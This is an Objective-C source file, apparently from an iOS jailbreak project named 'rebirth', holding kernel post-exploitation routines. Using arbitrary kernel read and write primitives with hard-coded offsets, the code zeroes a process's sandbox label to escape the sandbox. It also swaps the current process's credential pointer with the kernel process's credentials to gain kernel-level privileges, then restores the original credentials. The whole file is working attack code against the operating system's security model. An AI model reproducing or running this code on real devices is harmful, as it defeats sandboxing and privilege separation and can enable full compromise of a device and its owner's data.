//
//  kernel_patching.m
//  rebirth
//
//  Created by User on 13/07/2018.
//  Copyright © 2018 HackerHouse. All rights reserved.
//
#include "kernel_patching.h"
#import <Foundation/Foundation.h>

unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred


boolean_t unsandbox(pid_t pid) {
    uint64_t proc = proc_for_pid(pid);
    uint64_t ucred = kread64(proc + offsetof_p_ucred); //our credentials
    kwrite64(kread64(ucred + 0x78) + 8 + 8, 0x0); //get rid of sandbox by writing 0x0 to it
    return (kread64(kread64(ucred + 0x78) + 8 + 8) == 0) ? YES : NO;
}

uint64_t get_kern_cred() {
    uint64_t our_proc = proc_for_pid(getpid());
    uint64_t kernel_proc = proc_for_pid(0);
    uint64_t ourucred = rk64(our_proc+offsetof_p_ucred);
    uint64_t kernucred = rk64(kernel_proc+offsetof_p_ucred);
    wk64(our_proc+offsetof_p_ucred, kernucred);
    return ourucred;
}

uint64_t restore_cred(uint64_t ucred){
    uint64_t our_proc = proc_for_pid(getpid());
    uint64_t ourucred = rk64(our_proc+offsetof_p_ucred);
    wk64(our_proc+offsetof_p_ucred, ucred);
    return ourucred;
}



